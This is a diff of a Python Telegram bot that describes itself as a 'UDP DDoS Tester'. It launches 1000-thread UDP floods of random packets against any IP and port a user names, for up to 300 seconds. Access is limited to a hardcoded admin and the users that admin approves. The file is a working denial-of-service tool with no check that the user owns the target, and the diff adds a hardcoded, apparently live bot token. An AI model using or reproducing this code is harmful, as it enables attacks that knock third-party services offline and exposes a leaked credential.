@@ -1,17 +1,20 @@
+#!/usr/bin/env python3
+"""
+UDP DDoS Tester Bot - Complete Working Version
+Admin User ID: 6300435094 (Pre-authorized)
+"""
+
 import socket
 import threading
 import time
 import random
-import string
+import os
 import logging
 from datetime import datetime
-import asyncio
 import json
-import os
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 import uuid
-from config import BOT_TOKEN, ADMIN_USER_ID, MAX_THREADS
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
 from flask import Flask, jsonify
 
 # Configure logging
@@ -25,30 +28,19 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
+# Bot configuration
+BOT_TOKEN = "8266888318:AAGCcn95Hj0flaypDcyEEM0KjLfPPC2FPvw"
+ADMIN_USER_ID = 6300435094
+MAX_THREADS = 1000
+
 class UDPDDoSTester:
     def __init__(self):
         self.running_attacks = {}
-        self.authorized_users = set()
+        self.authorized_users = {ADMIN_USER_ID}  # Admin pre-added
         self.attack_logs = []
-        self.admin_user_id = 6300435094  # Hardcoded admin user ID
-        # Always add admin first, then load others
-        self.authorized_users.add(self.admin_user_id)
-        self.load_authorized_users()
-        # Ensure admin is always in authorized users
-        self.authorized_users.add(self.admin_user_id)
         self.save_authorized_users()
-        logger.info(f"Admin user {self.admin_user_id} pre-added to authorized users")
-        logger.info(f"Total authorized users: {len(self.authorized_users)}")
-        
-    def load_authorized_users(self):
-        """Load authorized users from file"""
-        try:
-            if os.path.exists('authorized_users.json'):
-                with open('authorized_users.json', 'r') as f:
-                    self.authorized_users = set(json.load(f))
-        except Exception as e:
-            logger.error(f"Error loading authorized users: {e}")
-    
+        logger.info(f"Bot initialized with admin {ADMIN_USER_ID} pre-authorized")
+
     def save_authorized_users(self):
         """Save authorized users to file"""
         try:
@@ -56,128 +48,68 @@ class UDPDDoSTester:
                 json.dump(list(self.authorized_users), f)
         except Exception as e:
             logger.error(f"Error saving authorized users: {e}")
-    
-    def generate_random_packet(self, size=1024):
-        """Generate random UDP packet data with binary content"""
-        # Generate more realistic binary data for stronger attacks
+
+    def load_authorized_users(self):
+        """Load authorized users from file"""
+        try:
+            if os.path.exists('authorized_users.json'):
+                with open('authorized_users.json', 'r') as f:
+                    loaded_users = set(json.load(f))
+                    self.authorized_users.update(loaded_users)
+                    # Always ensure admin is in the set
+                    self.authorized_users.add(ADMIN_USER_ID)
+        except Exception as e:
+            logger.error(f"Error loading authorized users: {e}")
+
+    def generate_packet(self, size=1024):
+        """Generate random UDP packet data"""
         return os.urandom(size)
-    
-    def generate_binary_payloads(self):
-        """Generate various binary payloads for different attack patterns"""
-        patterns = []
-        
-        # Different binary patterns for more realistic attacks
-        base_patterns = [
-            b'\x00' * 1024,  # Null bytes
-            b'\xFF' * 1024,  # All ones
-            b'\xAA' * 1024,  # Alternating pattern
-            b'\x55' * 1024,  # Alternating pattern
-            b'\xDE\xAD\xBE\xEF' * 256,  # Common test pattern
-            b'\xCA\xFE\xBA\xBE' * 256,  # Another test pattern
-            b'\xFE\xED\xFA\xCE' * 256,  # Another test pattern
-            b'\xBA\xAD\xF0\x0D' * 256,  # Another test pattern
-        ]
-        
-        # Add more complex binary patterns
-        complex_patterns = [
-            bytes(range(256)) * 4,  # Sequential bytes
-            bytes(range(255, -1, -1)) * 4,  # Reverse sequential
-            b'\x01\x02\x03\x04' * 256,  # Incremental pattern
-            b'\x80\x40\x20\x10' * 256,  # Bit pattern
-        ]
-        
-        patterns.extend(base_patterns)
-        patterns.extend(complex_patterns)
-        
-        # Add random binary data with different sizes
-        for _ in range(20):
-            size = random.choice([512, 1024, 1536, 2048])
-            patterns.append(os.urandom(size))
-        
-        # Add some realistic game protocol patterns
-        game_patterns = [
-            b'\x12\x34\x56\x78' + os.urandom(1020),  # Game header simulation
-            b'\xAB\xCD\xEF\x01' + os.urandom(1020),  # Another game pattern
-            b'\x00\x00\x00\x01' + os.urandom(1020),  # Sequence number pattern
-        ]
-        
-        patterns.extend(game_patterns)
-        
-        return patterns
-    
+
     def udp_flood_worker(self, target_ip, target_port, attack_id, duration):
-        """Worker function for UDP flood attack with binary payloads"""
+        """Worker function for UDP flood attack"""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.settimeout(1)
-            
-            # Generate binary payloads for this worker
-            binary_payloads = self.generate_binary_payloads()
-            payload_index = 0
             
             start_time = time.time()
             packets_sent = 0
             
             while time.time() - start_time < duration and attack_id in self.running_attacks:
                 try:
-                    # Use different binary payloads for more realistic attack
-                    packet_data = binary_payloads[payload_index % len(binary_payloads)]
+                    packet_data = self.generate_packet()
                     sock.sendto(packet_data, (target_ip, target_port))
                     packets_sent += 1
-                    payload_index += 1
-                    
-                    # Vary packet sizes for more realistic attack
-                    if packets_sent % 100 == 0:
-                        # Occasionally send larger packets
-                        large_packet = os.urandom(random.randint(1024, 2048))
-                        sock.sendto(large_packet, (target_ip, target_port))
-                        packets_sent += 1
-                    
-                    # Delay optimized for free plan
-                    time.sleep(0.01)  # Increased delay to prevent resource exhaustion
-                    
+                    time.sleep(0.01)  # Delay for free plan
                 except Exception as e:
                     logger.error(f"Error sending packet: {e}")
                     break
             
             sock.close()
-            logger.info(f"Worker completed: {packets_sent} binary packets sent to {target_ip}:{target_port}")
+            logger.info(f"Worker completed: {packets_sent} packets sent")
             
         except Exception as e:
             logger.error(f"Worker error: {e}")
-    
+
     def start_attack(self, target_ip, target_port, duration, user_id):
         """Start UDP DDoS attack"""
         attack_id = str(uuid.uuid4())
         
-        # Parse IP and port
+        # Validate inputs
         try:
-            if ':' in target_ip:
-                ip, port = target_ip.split(':')
-                target_port = int(port)
-            else:
-                ip = target_ip
-                target_port = int(target_port)
-        except:
-            return None, "Invalid IP:Port format"
+            target_port = int(target_port)
+            duration = int(duration)
+        except ValueError:
+            return None, "Invalid port or duration. Must be numbers."
         
-        # Validate IP address
-        try:
-            socket.inet_aton(ip)
-        except socket.error:
-            return None, "Invalid IP address"
-        
-        # Validate port
         if not (1 <= target_port <= 65535):
-            return None, "Invalid port number (1-65535)"
+            return None, "Invalid port. Must be between 1 and 65535."
         
-        # Validate duration
-        if not (1 <= duration <= 300):  # Max 5 minutes
-            return None, "Invalid duration (1-300 seconds)"
+        if not (1 <= duration <= 300):
+            return None, "Invalid duration. Must be between 1 and 300 seconds."
         
         # Start attack
         self.running_attacks[attack_id] = {
-            'target_ip': ip,
+            'target_ip': target_ip,
             'target_port': target_port,
             'duration': duration,
             'start_time': datetime.now(),
@@ -185,12 +117,12 @@ class UDPDDoSTester:
             'status': 'running'
         }
         
-        # Start threads for stronger DDoS
+        # Start threads
         threads = []
         for i in range(MAX_THREADS):
             thread = threading.Thread(
                 target=self.udp_flood_worker,
-                args=(ip, target_port, attack_id, duration)
+                args=(target_ip, target_port, attack_id, duration)
             )
             thread.daemon = True
             thread.start()
@@ -199,7 +131,7 @@ class UDPDDoSTester:
         # Log attack
         attack_log = {
             'attack_id': attack_id,
-            'target_ip': ip,
+            'target_ip': target_ip,
             'target_port': target_port,
             'duration': duration,
             'start_time': datetime.now().isoformat(),
@@ -208,30 +140,29 @@ class UDPDDoSTester:
         }
         self.attack_logs.append(attack_log)
         
-        logger.info(f"Binary attack started: {attack_id} -> {ip}:{target_port} for {duration}s with {MAX_THREADS} threads by user {user_id}")
+        logger.info(f"Attack started: {attack_id} -> {target_ip}:{target_port} for {duration}s")
         
-        # Schedule attack cleanup
-        def cleanup_attack():
+        # Schedule cleanup
+        def cleanup():
             time.sleep(duration)
             if attack_id in self.running_attacks:
                 self.running_attacks[attack_id]['status'] = 'completed'
-                logger.info(f"Attack completed: {attack_id}")
+                del self.running_attacks[attack_id]
         
-        cleanup_thread = threading.Thread(target=cleanup_attack)
+        cleanup_thread = threading.Thread(target=cleanup)
         cleanup_thread.daemon = True
         cleanup_thread.start()
         
-        return attack_id, f"🔥 Binary attack started: {ip}:{target_port} for {duration}s with {MAX_THREADS} threads"
-    
+        return attack_id, f"🔥 Attack started: {target_ip}:{target_port} for {duration}s with {MAX_THREADS} threads"
+
     def stop_attack(self, attack_id):
         """Stop running attack"""
         if attack_id in self.running_attacks:
-            self.running_attacks[attack_id]['status'] = 'stopped'
             del self.running_attacks[attack_id]
             logger.info(f"Attack stopped: {attack_id}")
             return True
         return False
-    
+
     def stop_all_attacks(self, user_id):
         """Stop all attacks by a specific user"""
         stopped_count = 0
@@ -246,34 +177,24 @@ class UDPDDoSTester:
                 stopped_count += 1
         
         return stopped_count
-    
+
     def get_running_attacks(self):
         """Get list of running attacks"""
         return self.running_attacks
-    
-    def get_attack_logs(self, limit=50):
+
+    def get_attack_logs(self, limit=10):
         """Get recent attack logs"""
         return self.attack_logs[-limit:]
 
 # Global instance
 ddos_tester = UDPDDoSTester()
 
-def ensure_admin_access(user_id):
-    """Ensure admin user always has access"""
-    if user_id == 6300435094:
-        if user_id not in ddos_tester.authorized_users:
-            ddos_tester.authorized_users.add(user_id)
-            ddos_tester.save_authorized_users()
-            logger.info(f"Admin {user_id} auto-authorized")
-        return True
-    return user_id in ddos_tester.authorized_users
-
-# Flask app for health check (free plan requirement)
+# Flask app for health check
 app = Flask(__name__)
 
 @app.route('/')
 def health_check():
-    """Health check endpoint for free plan"""
+    """Health check endpoint"""
     return jsonify({
         "status": "online",
         "bot": "UDP DDoS Tester",
@@ -284,45 +205,48 @@ def health_check():
 
 @app.route('/ping')
 def ping():
-    """Ping endpoint to keep service alive"""
+    """Ping endpoint"""
     return "pong"
+
+def is_authorized(user_id):
+    """Check if user is authorized"""
+    if user_id == ADMIN_USER_ID:
+        return True
+    return user_id in ddos_tester.authorized_users
 
 # Telegram Bot Commands
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Start command"""
     user_id = update.effective_user.id
     
-    if not ensure_admin_access(user_id):
-        await update.message.reply_text("❌ You are not authorized to use this bot. Contact admin (ID: 6300435094) to get access.")
+    if not is_authorized(user_id):
+        await update.message.reply_text("❌ You are not authorized. Contact admin (ID: 6300435094)")
         return
     
-    # Check if user is admin
-    is_admin = user_id == ddos_tester.admin_user_id
+    is_admin = user_id == ADMIN_USER_ID
     
     keyboard = [
         [InlineKeyboardButton("🚀 Start Attack", callback_data="attack")],
         [InlineKeyboardButton("🛑 Stop Attacks", callback_data="stop")],
-        [InlineKeyboardButton("📊 Running Attacks", callback_data="running")],
+        [InlineKeyboardButton("📊 Running", callback_data="running")],
         [InlineKeyboardButton("📋 Logs", callback_data="logs")]
     ]
     
     if is_admin:
-        keyboard.append([InlineKeyboardButton("👑 Approve User", callback_data="approve_user")])
+        keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin")])
     
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    admin_text = ""
-    if is_admin:
-        admin_text = "\n👑 **Admin Commands:**\n• /approve user_id - Approve new users\n• /admin - Show admin panel"
+    admin_text = "\n👑 **Admin Commands:**\n• /approve user_id - Approve users" if is_admin else ""
     
     await update.message.reply_text(
-        "🎯 **UDP DDoS Tester Bot**\n\n"
-        "Commands:\n"
-        f"• /attack ip:port:duration - Start binary attack ({MAX_THREADS} threads)\n"
-        "• /stop - Stop all your attacks\n"
-        "• /running - Show running attacks\n"
-        "• /logs - Show recent logs" + admin_text + "\n\n"
-        "Use the menu below or type commands directly:",
+        f"🎯 **UDP DDoS Tester Bot**\n\n"
+        f"Commands:\n"
+        f"• /attack ip:port:duration - Start attack ({MAX_THREADS} threads)\n"
+        f"• /stop - Stop all attacks\n"
+        f"• /running - Show running attacks\n"
+        f"• /logs - Show logs{admin_text}\n\n"
+        f"Use menu below or type commands:",
         reply_markup=reply_markup,
         parse_mode='Markdown'
     )
@@ -331,15 +255,12 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /attack command"""
     user_id = update.effective_user.id
     
-    if not ensure_admin_access(user_id):
-        await update.message.reply_text("❌ You are not authorized to use this bot.")
+    if not is_authorized(user_id):
+        await update.message.reply_text("❌ You are not authorized.")
         return
     
     if not context.args:
-        await update.message.reply_text(
-            "❌ Usage: /attack ip:port:duration\n"
-            "Example: /attack 192.168.1.1:8080:60"
-        )
+        await update.message.reply_text("❌ Usage: /attack ip:port:duration\nExample: /attack 192.168.1.1:8080:60")
         return
     
     try:
@@ -354,79 +275,80 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         attack_id, message = ddos_tester.start_attack(target_ip, target_port, duration, user_id)
         
         if attack_id:
-            await update.message.reply_text(f"✅ {message}\n🆔 Attack ID: `{attack_id}`\n\n💡 Use /stop to stop all your attacks", parse_mode='Markdown')
+            await update.message.reply_text(f"✅ {message}\n🆔 ID: `{attack_id}`\n\n💡 Use /stop to stop", parse_mode='Markdown')
         else:
             await update.message.reply_text(f"❌ {message}")
             
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {str(e)}")
 
+async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle /stop command"""
+    user_id = update.effective_user.id
+    
+    if not is_authorized(user_id):
+        await update.message.reply_text("❌ You are not authorized.")
+        return
+    
+    stopped_count = ddos_tester.stop_all_attacks(user_id)
+    
+    if stopped_count > 0:
+        await update.message.reply_text(f"🛑 Stopped {stopped_count} attack(s)!")
+    else:
+        await update.message.reply_text("ℹ️ No attacks to stop.")
+
 async def running_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /running command"""
     user_id = update.effective_user.id
-    if not ensure_admin_access(user_id):
-        await update.message.reply_text("❌ You are not authorized to use this bot.")
+    
+    if not is_authorized(user_id):
+        await update.message.reply_text("❌ You are not authorized.")
         return
     
     running = ddos_tester.get_running_attacks()
     
     if not running:
-        await update.message.reply_text("📊 No attacks currently running.")
+        await update.message.reply_text("📊 No attacks running.")
         return
     
     message = "📊 **Running Attacks:**\n\n"
     for attack_id, attack in running.items():
         elapsed = datetime.now() - attack['start_time']
         remaining = attack['duration'] - elapsed.total_seconds()
-        message += f"🆔 `{attack_id}`\n"
-        message += f"🎯 Target: `{attack['target_ip']}:{attack['target_port']}`\n"
-        message += f"⏱️ Remaining: `{max(0, int(remaining))}s`\n"
-        message += f"👤 User: `{attack['user_id']}`\n\n"
+        message += f"🆔 `{attack_id[:8]}...`\n"
+        message += f"🎯 {attack['target_ip']}:{attack['target_port']}\n"
+        message += f"⏱️ {max(0, int(remaining))}s left\n\n"
     
     await update.message.reply_text(message, parse_mode='Markdown')
 
 async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /logs command"""
     user_id = update.effective_user.id
-    if not ensure_admin_access(user_id):
-        await update.message.reply_text("❌ You are not authorized to use this bot.")
+    
+    if not is_authorized(user_id):
+        await update.message.reply_text("❌ You are not authorized.")
         return
     
-    logs = ddos_tester.get_attack_logs(10)
+    logs = ddos_tester.get_attack_logs(5)
     
     if not logs:
         await update.message.reply_text("📋 No logs available.")
         return
     
-    message = "📋 **Recent Attack Logs:**\n\n"
+    message = "📋 **Recent Logs:**\n\n"
     for log in reversed(logs):
-        message += f"🆔 `{log['attack_id']}`\n"
-        message += f"🎯 `{log['target_ip']}:{log['target_port']}`\n"
-        message += f"⏱️ Duration: `{log['duration']}s`\n"
-        message += f"👤 User: `{log['user_id']}`\n"
-        message += f"🕐 Time: `{log['start_time']}`\n\n"
+        message += f"🆔 `{log['attack_id'][:8]}...`\n"
+        message += f"🎯 {log['target_ip']}:{log['target_port']}\n"
+        message += f"⏱️ {log['duration']}s\n"
+        message += f"🕐 {log['start_time']}\n\n"
     
     await update.message.reply_text(message, parse_mode='Markdown')
-
-async def add_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /add command (deprecated - use /approve instead)"""
-    user_id = update.effective_user.id
-    if not ensure_admin_access(user_id):
-        await update.message.reply_text("❌ You are not authorized to use this bot.")
-        return
-    
-    await update.message.reply_text("⚠️ This command is deprecated. Use /approve instead.")
 
 async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /approve command (admin only)"""
     user_id = update.effective_user.id
     
-    if not ensure_admin_access(user_id):
-        await update.message.reply_text("❌ You are not authorized to use this bot.")
-        return
-    
-    # Check if user is admin
-    if user_id != 6300435094:
+    if user_id != ADMIN_USER_ID:
         await update.message.reply_text("❌ Only admin can approve users.")
         return
     
@@ -438,10 +360,10 @@ async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         new_user_id = int(context.args[0])
         ddos_tester.authorized_users.add(new_user_id)
         ddos_tester.save_authorized_users()
+        await update.message.reply_text(f"✅ User {new_user_id} approved!")
         logger.info(f"Admin {user_id} approved user {new_user_id}")
-        await update.message.reply_text(f"✅ User {new_user_id} approved successfully!")
     except ValueError:
-        await update.message.reply_text("❌ Invalid user ID. Must be a number.")
+        await update.message.reply_text("❌ Invalid user ID.")
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {str(e)}")
 
@@ -449,27 +371,21 @@ async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /admin command (admin only)"""
     user_id = update.effective_user.id
     
-    if not ensure_admin_access(user_id):
-        await update.message.reply_text("❌ You are not authorized to use this bot.")
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("❌ Only admin can access this.")
         return
     
-    # Check if user is admin
-    if user_id != 6300435094:
-        await update.message.reply_text("❌ Only admin can access this command.")
-        return
-    
-    # Show admin info and authorized users
     authorized_count = len(ddos_tester.authorized_users)
     running_count = len(ddos_tester.get_running_attacks())
     
     message = f"👑 **Admin Panel**\n\n"
-    message += f"🆔 Admin ID: `6300435094`\n"
-    message += f"👥 Authorized Users: `{authorized_count}`\n"
-    message += f"🚀 Running Attacks: `{running_count}`\n\n"
-    message += f"**Authorized Users:**\n"
+    message += f"🆔 Admin ID: `{ADMIN_USER_ID}`\n"
+    message += f"👥 Authorized: `{authorized_count}`\n"
+    message += f"🚀 Running: `{running_count}`\n\n"
+    message += f"**Users:**\n"
     
     for user in sorted(ddos_tester.authorized_users):
-        if user == 6300435094:
+        if user == ADMIN_USER_ID:
             message += f"👑 `{user}` (Admin)\n"
         else:
             message += f"👤 `{user}`\n"
@@ -477,69 +393,29 @@ async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(message, parse_mode='Markdown')
 
 async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /debug command for troubleshooting"""
+    """Handle /debug command"""
     user_id = update.effective_user.id
     
-    if not ensure_admin_access(user_id):
-        await update.message.reply_text("❌ You are not authorized to use this bot.")
+    if not is_authorized(user_id):
+        await update.message.reply_text("❌ You are not authorized.")
         return
     
-    # Show debug info
-    message = f"🔍 **Debug Information**\n\n"
-    message += f"🆔 Your User ID: `{user_id}`\n"
-    message += f"👑 Admin ID: `6300435094`\n"
-    message += f"✅ Is Admin: `{user_id == 6300435094}`\n"
-    message += f"✅ Is Authorized: `{user_id in ddos_tester.authorized_users}`\n"
-    message += f"👥 Total Authorized: `{len(ddos_tester.authorized_users)}`\n\n"
-    message += f"**Authorized Users:**\n"
-    
-    for user in sorted(ddos_tester.authorized_users):
-        if user == 6300435094:
-            message += f"👑 `{user}` (Admin)\n"
-        else:
-            message += f"👤 `{user}`\n"
+    message = f"🔍 **Debug Info**\n\n"
+    message += f"🆔 Your ID: `{user_id}`\n"
+    message += f"👑 Admin ID: `{ADMIN_USER_ID}`\n"
+    message += f"✅ Is Admin: `{user_id == ADMIN_USER_ID}`\n"
+    message += f"✅ Authorized: `{user_id in ddos_tester.authorized_users}`\n"
+    message += f"👥 Total Users: `{len(ddos_tester.authorized_users)}`\n"
     
     await update.message.reply_text(message, parse_mode='Markdown')
-
-async def force_add_admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /forceaddadmin command to manually add admin"""
-    user_id = update.effective_user.id
-    
-    # Force add admin to authorized users
-    ddos_tester.authorized_users.add(6300435094)
-    ddos_tester.save_authorized_users()
-    
-    message = f"✅ **Admin Force Added**\n\n"
-    message += f"🆔 Admin ID: `6300435094`\n"
-    message += f"👥 Total Authorized: `{len(ddos_tester.authorized_users)}`\n"
-    message += f"✅ Admin is now authorized!"
-    
-    await update.message.reply_text(message, parse_mode='Markdown')
-    logger.info(f"Admin 6300435094 force added by user {user_id}")
-
-async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /stop command"""
-    user_id = update.effective_user.id
-    if not ensure_admin_access(user_id):
-        await update.message.reply_text("❌ You are not authorized to use this bot.")
-        return
-    
-    # Stop all attacks by this user
-    stopped_count = ddos_tester.stop_all_attacks(user_id)
-    
-    if stopped_count > 0:
-        await update.message.reply_text(f"🛑 Stopped {stopped_count} attack(s) successfully!")
-        logger.info(f"User {user_id} stopped {stopped_count} attacks")
-    else:
-        await update.message.reply_text("ℹ️ No running attacks found to stop.")
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle button callbacks"""
     query = update.callback_query
     user_id = query.from_user.id
     
-    if not ensure_admin_access(user_id):
-        await query.answer("❌ You are not authorized to use this bot.", show_alert=True)
+    if not is_authorized(user_id):
+        await query.answer("❌ You are not authorized.", show_alert=True)
         return
     
     await query.answer()
@@ -551,54 +427,32 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "Example: /attack 192.168.1.1:8080:60",
             parse_mode='Markdown'
         )
+    elif query.data == "stop":
+        await stop_command(update, context)
     elif query.data == "running":
         await running_command(update, context)
     elif query.data == "logs":
         await logs_command(update, context)
-    elif query.data == "stop":
-        await stop_command(update, context)
-    elif query.data == "approve_user":
-        await query.edit_message_text(
-            "👑 **Approve User**\n\n"
-            "Send: /approve user_id\n"
-            "Example: /approve 123456789\n\n"
-            "Only admin can approve users.",
-            parse_mode='Markdown'
-        )
-
+    elif query.data == "admin":
+        await admin_command(update, context)
 
 def run_flask():
-    """Run Flask app for health check"""
+    """Run Flask app"""
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
 
 def main():
-    """Main function to run the bot"""
-    # Use bot token from config or environment variable
-    bot_token = os.getenv('BOT_TOKEN', BOT_TOKEN)
-    if not bot_token or bot_token == 'your_bot_token_here':
-        logger.error("BOT_TOKEN not configured! Please set it in config.py or environment variable.")
-        return
+    """Main function"""
+    logger.info("Starting UDP DDoS Tester Bot...")
+    logger.info(f"Admin User ID: {ADMIN_USER_ID}")
+    logger.info(f"Max Threads: {MAX_THREADS}")
     
-    # Add startup delay to prevent conflicts
-    logger.info("Waiting 10 seconds before starting bot to avoid conflicts...")
-    time.sleep(10)
-    
-    # Start Flask in background for health check
-    import threading
+    # Start Flask in background
     flask_thread = threading.Thread(target=run_flask)
     flask_thread.daemon = True
     flask_thread.start()
     
-    # Create application
-    application = Application.builder().token(bot_token).build()
-    
-    # Clean up any existing webhooks to prevent conflicts
-    try:
-        bot = application.bot
-        bot.delete_webhook(drop_pending_updates=True)
-        logger.info("Cleaned up existing webhooks")
-    except Exception as e:
-        logger.warning(f"Could not clean webhooks: {e}")
+    # Create bot application
+    application = Application.builder().token(BOT_TOKEN).build()
     
     # Add command handlers
     application.add_handler(CommandHandler("start", start))
@@ -606,36 +460,18 @@ def main():
     application.add_handler(CommandHandler("stop", stop_command))
     application.add_handler(CommandHandler("running", running_command))
     application.add_handler(CommandHandler("logs", logs_command))
-    application.add_handler(CommandHandler("add", add_user_command))
     application.add_handler(CommandHandler("approve", approve_command))
     application.add_handler(CommandHandler("admin", admin_command))
     application.add_handler(CommandHandler("debug", debug_command))
-    application.add_handler(CommandHandler("forceaddadmin", force_add_admin_command))
     
-    # Add button callback handler
-    application.add_handler(MessageHandler(filters.Regex("^/"), start))
-    
-    # Add callback query handler
-    from telegram.ext import CallbackQueryHandler
+    # Add callback handler
     application.add_handler(CallbackQueryHandler(button_callback))
     
-    # Start the bot with conflict handling
-    logger.info("Starting UDP DDoS Tester Bot...")
+    # Start bot
     try:
-        # Drop pending updates to avoid conflicts
-        application.run_polling(
-            drop_pending_updates=True,
-            allowed_updates=Update.ALL_TYPES
-        )
+        application.run_polling(drop_pending_updates=True)
     except Exception as e:
-        logger.error(f"Bot startup error: {e}")
-        # Wait and retry once
-        time.sleep(5)
-        logger.info("Retrying bot startup...")
-        application.run_polling(
-            drop_pending_updates=True,
-            allowed_updates=Update.ALL_TYPES
-        )
+        logger.error(f"Bot error: {e}")
 
 if __name__ == "__main__":
     main()
